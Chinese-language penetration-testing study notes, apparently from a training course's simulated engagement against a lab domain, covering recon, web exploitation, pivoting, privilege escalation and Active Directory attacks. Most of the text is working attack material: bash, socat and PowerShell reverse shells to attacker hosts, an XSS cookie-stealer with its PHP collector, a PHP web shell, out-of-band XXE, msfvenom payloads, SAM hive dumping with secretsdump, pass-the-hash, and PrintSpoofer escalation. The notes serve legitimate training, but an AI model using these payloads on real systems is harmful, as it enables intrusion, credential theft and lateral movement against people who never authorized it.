步骤
项目前 (Pre-Engagement)
信息收集 (Information Gathering)
漏洞评估 (Vulnerability Assessment)
漏洞利用 (Exploitation)
后渗透 (Post-Exploitation)
横向移动 (Lateral Movement)
概念验证 (Proof of Concept)
项目后 (Post-Engagement)


被拆分到前面的 27 个模块中
Active Directory Enumeration & Attacks 模块章节中一次 Active Directory 渗透测试的横向剖析（分步讲解）
Active Directory Enumeration & Attacks 技能评估中的 2 次小型/模拟 Active Directory 渗透测试
Shells & Payloads 模块技能评估中的 1 次小型/模拟渗透测试
Pivoting, Tunneling, & Port Forwarding 模块技能评估中的 1 次小型/模拟渗透测试
Documentation & Reporting 模块中的 1 次小型/模拟内部渗透测试（探索式学习与引导式学习相结合）


项目启动
一份由我方公司管理层和客户授权人员共同签署的工作范围说明书 (Scope of Work, SoW)
这份 SoW 文件列出了测试的具体内容、方法论 (methodology)、时间线 (timeline) 以及商定的会议和交付物 (deliverables)
客户还签署了一份单独的交战规则 (RoE) 文件，也称为测试授权书 (Authorization to Test document)
测试前，持有这份文件至关重要
其中列出所有评估类型的范围（URL、单个 IP 地址、CIDR 网络范围，以及适用的凭据）
还列出双方的关键人员（双方至少各两名联系人，包括手机号码和电子邮件地址）
还列出具体细节，如测试的开始和结束日期，以及允许的测试窗口期 (testing window)
获得了一周的测试时间，额外的两天用于撰写报告草稿（在测试过程中同步进行撰写工作）


外部信息收集
sudo nmap --open -oA inlanefreight_ept_tcp_1k -iL scope
确保所有扫描输出保存到项目目录中的相关子目录中
sudo nmap --open -p- -A -oA inlanefreight_ept_tcp_all_svc -iL scope      -A 除了运行了 -sC ,更完整激进
整理结果示例，剩下端口和服务
  egrep -v "^#|Status: Up" inlanefreight_ept_tcp_all_svc.gnmap | cut -d ' ' -f4- | tr ',' '\n' | \                                                               
  sed -e 's/^[ \t]*//' | awk -F '/' '{print $7}' | grep -v "^$" | sort | uniq -c \
  | sort -k 1 -nr
dig axfr inlanefreight.local @10.129.203.101    发现 DNS，尝试找 subdomain
其它方式
  https://dnsdumpster.com/
  信息收集模块列出了几种被动子域名枚举 (Passive Subdomain Enumeration)和主动子域名枚举 (Active Subdomain Enumeration)的方法，如使用 ffuf 执行虚拟主机 (vhost) 枚举
sudo sh -c 'echo "10.129.197.76 inlanefreight.local" >> /etc/hosts'      追加 vhost
curl -sI http://10.129.203.114/ -H "Host: defnotvalid.inlanefreight.local" | grep "Content-Length:"      查看无效结果
ffuf -w namelist.txt:FUZZ -u http://10.129.203.101/ -H 'Host:FUZZ.inlanefreight.local' -fs 15157      排除 15157 无效结果
手动追加到 /etc/hosts
sudo tee -a /etc/hosts > /dev/null <<EOT
## inlanefreight hosts 
10.129.203.101 inlanefreight.local blog.inlanefreight.local careers.inlanefreight.local dev.inlanefreight.local gitlab.inlanefreight.local ir.inlanefreight.local status.inlanefreight.local support.inlanefreight.local tracking.inlanefreight.local vpn.inlanefreight.local
EOT
尝试匿名FTP
ftp 10.129.203.101
Name (10.129.203.101:tester): anonymous
ls
get
put    发现不能上传
其他攻击，例如 FTP 反弹攻击 (FTP Bounce Attack)，可能性不大
搜索 vsFTPd 3.0.3 的公开漏洞利用 (public exploits) 只找到了这个针对远程拒绝服务 (Remote Denial of Service) 的 PoC (概念验证)，超出了测试的范围
nc -nv 10.129.203.101 22      抓取 SSH 的 banner
sudo nmap -sV -sC -p25 10.129.203.101      扫描SMTP
telnet 10.129.203.101 25
使用 VRFY 命令来枚举系统用户 (enumerate system users)
VRFY root
VRFY www-data
VRFY randomuser
用这个列表对 FTP 和 SSH 服务以及可能的服务发起密码暴力破解，尽管这个风险较低，但作为报告中的一个低危 (Low) 发现项是值得的
如果没有业务需要，应该建议 VRFY
可以尝试使用像 smtp-user-enum 这样的工具来枚举更多用户
  https://github.com/pentestmonkey/smtp-user-enum
telnet 10.129.203.101 110     连接POP3
user  randomuser      枚举用户
如果使用 Office 365 或本地部署的 Exchange，可以发起一次密码喷洒
nmap -p25 -Pn --script smtp-open-relay  10.129.203.101      检查开放中继，有的话可以任意编辑发件人钓鱼
网络钓鱼不在本次范围内，对于大多数外部渗透测试也是，遇到这种类型的漏洞，值得报告
端口 111 是 rpcbind 服务，不应该对外暴露，可以为此编写一个不必要的暴露服务 (Unnecessary Exposed Services) 的低危发现
在现代环境中，很少看到像存在漏洞的 FTP 服务器或类似的，能直接导致远程代码执行 (Remote Code Execution, RCE)
eyewitness -f ilfreight_subdomains -d      ilfreight_subdomains 里存放了subdomains
  https://github.com/RedSiege/EyeWitness

curl -s http://blog.inlanefreight.local | grep Drupal      发现使用 Drupal

任何 Web 应用程序上测试用户注册功能总是一个好主意
可以使用像 10 Minute Mail 的一次性电子邮箱，或者保留一个 ProtonMail 或类似服务的虚拟账户专门用于测试
http://careers.inlanefreight.local/profile?id=9，对 id 参数进行模糊测试
以查找 SQLi、命令注入、文件包含、XSS 等
  http://careers.inlanefreight.local/profile?id=9 UNION SELECT username,password FROM users--      SQLi
  http://careers.inlanefreight.local/profile?id=9; bash -i >& /dev/tcp/攻击者IP/4444 0>&1          命令注入
  http://careers.inlanefreight.local/profile?id=../../../../etc/passwd%00                          L文件包含
  http://careers.inlanefreight.local/profile?id=http://攻击者IP/shell.php                           R文件包含
  http://careers.inlanefreight.local/profile?id=<script>fetch('http://攻击者IP/steal?cookie='+document.cookie)</script>      XSS

gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300      爆破目录
  https://github.com/OJ/gobuster
使用 OPTIONS 方法请求页面，看到允许多种方法：GET,POST,PUT,TRACK,OPTIONS      
使用 TRACK 方法请求该页面，即 HTTP 动词篡改 (HTTP Verb Tampering) 漏洞
将以下文件另存为 5351bf7271abaa2267e03c9ef6393f13.php 或类似，一个随机文件名是一个好习惯，随机的攻击者就不会偶然发现
<?php system($_GET['cmd']); ?>
尝试上传 .php 文件会导致错误：“JPG, JPEG, PNG & GIF files are allowed.”，存在一些弱的客户端验证 (client-side validation)
抓取 POST 请求，发送到 Repeater，修改请求中的 Content-Type: 头，将头更改为 Content-Type: image/png，以将 web shell 伪装成有效的 PNG
curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=id      执行 web shell

有网页托管在 WordPress
sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local      枚举 WordPress 的插件
curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd      mail-masta 插件的漏洞
wpscan -e u -t 500 --url http://ir.inlanefreight.local      枚举用户
wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp      爆破 ilfreightwp，用 Hydra 也行
用 Burp 捕获 POST 请求，将其保存到文件 sqli.txt ，并用 * 标记 searchitem 参数，让 sqlmap 只在 searchitem 注入，sqlmap 默认检测所有参数（URL参数、POST数据、Cookie等）
sqlmap -r sqli.txt --dbms=mysql      自动 SQL 攻击工具，sqli.txt 是一个 POST 完整请求
sqlmap -r sqli.txt --dbms=mysql --dbs                    枚举数据库
sqlmap -r sqli.txt --dbms=mysql -D status --tables      枚举 status 库里的表格
sqlmap -r sqli.txt --dbms=mysql --dump -D status -T users --batch      dump 拉出 users 表格所有数据，batch 非交互式

有工单提交网页
在 Message 字段中包含以下内容，并提交工单
  "><script src=http://10.10.14.15:9000/TESTING_THIS></script>            盲注跨站脚本 (Blind Cross-Site Scripting, XSS)
nc -lvnp 9000      提交前监听
实例
创建 index.php            url-decode 传过来的 cookies      3
    <?php
  if (isset($_GET['c'])) {
      $list = explode(";", $_GET['c']);
      foreach ($list as $key => $value) {
          $cookie = urldecode($value);
          $file = fopen("cookies.txt", "a+");
          fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
          fclose($file);
      }
  }
  ?>
创建 script.js            redirect the request to the index.php
  new Image().src='http://10.10.14.15:9200/index.php?c='+document.cookie            创建一个图片，但是传递了管理员的 cookies      2
sudo php -S 0.0.0.0:9200      启动 php 网页服务
在 Message 字段中包含以下内容，并提交工单
  "><script src=http://10.10.14.15:9200/script.js></script>        通过 php 网页服务，访问攻击机上的 script.js      1
用像 Cookie-Editor 的 Firefox 插件，使用管理员的会话 cookie 登录
  https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search

有应用程序接收用户输入并生成一个 PDF 文档
插入一个简单的 JavaScript payload，如 <script>document.write('TESTING THIS')</script>，发现 JS 被执行，即 SSRF 漏洞，弱版 XSS
  <script>
      x=new XMLHttpRequest;
      x.onload=function(){
      document.write(this.responseText)};
      x.open("GET","file:///flag.txt");
      x.send();
  </script>

  https://appsecco.com/blog/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2
  https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f



http://careers.inlanefreight.local/profile?id=4            IDOR

change the request method from GET to TRACK, and add/inject the header X-Custom-IP-Authorization with 127.0.0.1          用 X-Custom-IP-Authorization: 127.0.0.1 模拟本地请求，进入管理功能 （后端逻辑放行127）
curl -s http://dev.inlanefreight.local/uploads/9125309563421.php?cmd=cat /var/www/html/flag.txt

WordPress website
add at the beginning in "404 Template" (404.php):
exec("/bin/bash -c 'bash -i > /dev/tcp/PWNIP/PWNPO 0>&1'");
sudo nc -nvlp PWNPO
curl http://ir.inlanefreight.local/wp-content/themes/twentytwenty/404.php

GitLab website
navigate to http://gitlab.inlanefreight.local and click on Menu --> Explore Projects
a namespace of shopdev2.inlanefreight.local, add it into /etc/hosts with the same entry as gitlab.inlanefreight.local
sudo sh -c 'echo "STMIP gitlab.inlanefreight.local shopdev2.inlanefreight.local" >> /etc/hosts'
navigate to http://shopdev2.inlanefreight.local
weak credentials admin:admin
replace the XML with an XXE Injection payload that will read the "flag.txt"            XML外部实体注入
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE userid [
    <!ENTITY xxetest SYSTEM "file:///flag.txt">            解析到 SYSTEM 关键字，知道这是一个外部实体
  ]>
  <root>
      <subtotal>
          undefined
      </subtotal>
      <userid>
          &xxetest;
      </userid>
  </root>
如果后端不回显 userid 的内容
可以用 带外交互（Out-of-Band，OOB） 技术
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE userid [
    <!ENTITY % xxe SYSTEM "http://10.10.14.15:9000/evil.dtd">            目标解析XML，发现 %xxe;，加载 http://10.10.14.15:9000/evil.dtd
    %xxe;
  ]>
  <root>
      <userid>&xxetest;</userid>
  </root>
evil.dtd 的内容
  <!ENTITY % file SYSTEM "file:///flag.txt">
  <!ENTITY % eval "<!ENTITY &#x25; xxetest SYSTEM 'file:///flag.txt'>">
  %eval;
  %file;
python3 -m http.server 9000

hydra -l admin -P /usr/share/SecLists/Passwords/darkweb2017-top100.txt "http-post-form://monitoring.inlanefreight.local/login.php:username=admin&password=^PASS^:Invalid Credentials!"
login and get a web terminal, use TAB or 'help' for available commands
try IDOR in Burp
  GET /ping.php?ip=127.0.0.1%0acat${IFS}00112233_flag.txt HTTP/1.1
  GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash HTTP/1.1      获得 Socat 反向 shell
  socat file:`tty`,raw,echo=0 tcp-listen:4443      监听 socat 反向 shell

Upgrade interactive TTY
  https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
socat file:`tty`,raw,echo=0 tcp-listen:4443
nc -lnvp 8443
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash HTTP/1.1      获得 Socat 反向 shell
nc -lnvp 4443
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443      升级 iTTY

aureport --tty | less      读取审计日志，tty 历史
  https://linux.die.net/man/8/aureport

LinPEAS - inux Privilege Escalation Awesome Script
  https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

获得长立足点
srvadm@dmz01:~$ LFILE=/root/.ssh/id_rsa      设置路径
srvadm@dmz01:~$ sudo /usr/bin/openssl enc -in $LFILE      屏显私钥
复制私钥到 dmz01_key
chmod 600 dmz01_key
ssh -i dmz01_key root@10.129.203.111

ssh -D 8081 -i dmz01_key root@10.129.203.111      从攻击机8081端口访问跳板机，再访问内网
netstat -antp | grep 8081      查看攻击网络
sudo vim /etc/proxychains.conf
添加：socks4 127.0.0.1 8081 到 proxylist

proxychains nmap -sT -p 21,22,80,8080 172.16.8.120      扫描内网的 172.16.8.120 （第二网卡 或 内网其它机器）

用 msf 做 rs 和转发
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f elf > shell.elf      生成 rs pl
scp -i dmz01_key shell.elf root@10.129.203.111:/tmp      上传 pl
设置 Metasploit 的 exploit/multi/handler
root@dmz01:/tmp# chmod +x shell.elf 
root@dmz01:/tmp# ./shell.elf
exploit
background
use post/multi/manage/autoroute 
run
use post/multi/gather/ping_sweep      扫描内网主机
root@dmz01:~# for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from      在跳板机执行，同样扫描
也可以通过 Proxychains 使用 Nmap 来枚举 172.16.8.0/23 子网中的主机，但非常慢

172.16.8.3 是一个域控制器 (Domain Controller)
因为看到像 Kerberos 和 LDAP 这样的开放端口
暂时可以先把它放在一边，因为不太可能被直接利用

快速检查域控制器是否存在 SMB 空会话 (NULL session)
如果能导出用户列表
就可以尝试进行有节制的密码喷洒 (password spraying) 攻击
如果知道密码策略，就可以合理安排攻击时间以避免账户锁定 (account lockout)
如果找不到其他可利用点
可以回过头来使用 Kerbrute，通过各种用户列表以及（在真实渗透测试中）从公司 LinkedIn 页面枚举出的潜在用户名来枚举有效用户名
有了用户列表，可以尝试进行 1-2 次喷洒攻击
也可以尝试进行 ASREPRoasting 攻击

proxychains enum4linux -U -P 172.16.8.3      尝试获得用户列表和密码策略

通过 proxychains msfconsole 启动另一个使用 Proxychains 的 Metasploit 实例
auxiliary/scanner/http/tomcat_mgr_login      攻击 Tomecat

 DotNetNuke (DNN)
一个用 .NET 编写的内容管理系统 (CMS)，基本上是 .NET 领域的 WordPress

proxychains showmount -e 172.16.8.20      展示 NFS
mkdir DEV01
mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01      在跳板机，挂载到 /tmp/DEV01

tcpdump -i ens192 -s 65535 -w ilfreight_pcap      抓网卡 ens192 的包，存到 ilfreight_pcap
用 WireShark 打卡

关于 DNN，另一个有趣的地方是允许添加文件扩展名 来允许上传 .asp 和 .aspx 文件
接下来需要提升权限
查到 SeImpersonate 权限
通过 SeImpersonate and SeAssignPrimaryToken，将权限提升到 SYSTEM，这将在活动目录 (Active Directory, AD) 域中获得一个初步的立足点，并允许开始枚举 AD
尝试使用 PrintSpoofer 工具提升权限，然后看看是否能从主机的内存或注册表 (registry) 中转储 (dump) 任何有用的凭据
在 DEV01 主机上需要 nc.exe 来向我们自己发送一个 shell，以及 PrintSpoofer64.exe 二进制文件来利用 SeImpersonate 权限
有几种方法可以将它们传输上去
可以使用 dmz01 主机作为“跳板机 (jump host)”，通过 SCP 将工具传输过去，然后启动一个 Python3 Web 服务器，并使用 certutil 将它们下载到 DEV01 主机上
一个更简单的方法是再次修改 DNN 的 Allowable File Extensions，允许 .exe 文件格式
然后上传这两个文件，并通过 shell 确认它们位于 c:\DotNetNuke\Portals\0
上传后，可以在 dmz01 主机上启动一个 Netcat 监听器 ，并运行以下命令以获取一个 NT AUTHORITY\SYSTEM 权限的反向 shell：
c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 443 -e cmd"

下载SAM
c:\DotNetNuke\Portals\0> reg save HKLM\SYSTEM SYSTEM.SAVE
c:\DotNetNuke\Portals\0> reg save HKLM\SECURITY SECURITY.SAVE
c:\DotNetNuke\Portals\0> reg save HKLM\SAM SAM.SAVE

secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE      提取哈希
  该命令会从三个注册表文件中提取：
  sam 数据库中的用户密码哈希值（NTLM 哈希）
  security 数据库中的 LSA Secrets（包括缓存的域凭据、服务账户密码等）
  system 用于解密这些哈希值

proxychains crackmapexec smb 172.16.8.20 --local-auth -u administrator -H <redacted>      登录
  显示 (Pwn3d!) 表示登录成功
  可加 -x "whoami"
  可多主机 smb 172.16.8.20-25

也可以利用 PrintNightmare 漏洞在 DEV01 主机上提升权限
还有其他方法可以检索凭据，例如 Mimikatz

反向端口转发
msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.8.120 -f exe -o teams.exe LPORT=443      生成 pl
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 7000
run
scp 或 http 服务器或 DNN 上传到跳板机
ssh -i dmz01_key -R 172.16.8.120:443:0.0.0.0:7000 root@10.129.203.111 -vN      -R 枢纽机在 443 端口上监听，将所有进入此端口的流量转发到攻击机上配置的 Metasploit 监听器 0.0.0.0:7000
枢纽机执行 teams.exe
  默认情况下，OpenSSH 只允许从本身连接到远程转发的端口
  须在枢纽机编辑 /etc/ssh/sshd_config 文件
  并将 GatewayPorts no 这一行更改为 GatewayPorts yes
  需要对用作枢纽的主机拥有 root SSH 访问权限
  如果我们没有 root 权限来临时修改 SSH 配置文件（并使用 service sshd reload 重新加载以使其生效）
  将无法以这种方式执行端口转发
  这种类型的更改会在客户的系统中打开一个安全漏洞
  需要沟通与恢复
  https://www.ssh.com/academy/ssh/tunneling-example

在攻击机上的 firefox 使用隧道
sudo ssh -D 9050 -i id_rsa root@10.129.203.114      设置代理隧道
在 firefox 设置代理 127.0.0.1:9050
proxychains firefox 172.16.8.20      隧道访问目标
使用 DNN 的 SQL console
EXEC sp_configure 'show advanced options', '1'            启动 xp_cmdshell
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
在 DNN 的 security，允许 asp,aspx,exe,SAVE， by editing "Allowable File Extensions"
通过 DNN 上传一个 newcmdasp.asp 的 shell pl
root@dmz01:~# nc -nvlp 9999
root@dmz01:~# ip a show ens192 | grep "inet" -m 1      查看内网网卡
在浏览器点击使用 web shell 输入
  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.8.120',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
从攻击机通过 DNN 上传下面的 pl
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
root@dmz01:~# nc -nvlp 8888
C:\windows\system32\inetsrv> c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 8888 -e cmd"
cd c:\dotnetnuke\portals\0\
reg save HKLM\SYSTEM SYSTEM.SAVE
reg save HKLM\SECURITY SECURITY.SAVE
reg save HKLM\SAM SAM.SAVE
通过 DNN 下载上面3个 SAVE 到攻击机
secretsdump.py LOCAL -system ~/Downloads/SYSTEM.SAVE -sam ~/Downloads/SAM.SAVE -security ~/Downloads/SECURITY.SAVE

使用 SharpHound 收集器来枚举所有 AD 对象
将数据导入 BloodHound 图形用户界面 (GUI) 进行审查
可以下载该可执行文件（但最好自己编译工具，绕过查杀）
使用 DNN 文件管理器上传
c:\DotNetNuke\Portals\0> SharpHound.exe -c All

sudo neo4j start      启动 neo4j 服务，节点数据库
bloodhound      打开GUI
搜索用户 hporter
选择 First Degree Object Control（一级对象控制）
看到该用户对 ssmalls 用户拥有 ForceChangePassword（强制更改密码）权限
另外，看到所有域用户 (Domain Users) 都对 DEV01 主机拥有 RDP 访问权限
意味着域中的任何用户都可以通过 RDP 登录
如果他们能够提升权限 (escalate privileges)
就有可能窃取凭据等敏感数据
这一点值得作为一个发现记录下来；称之为 Excessive Active Directory Group Privileges（活动目录组权限过高），将其标记为中等风险
如果整个组对某台主机拥有本地管理员权限 (local admin rights)，是一个高风险发现
使用 PowerView 来更改 ssmalls 的密码

ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111            本地 13389 -> 枢纽 3389 -> 目标

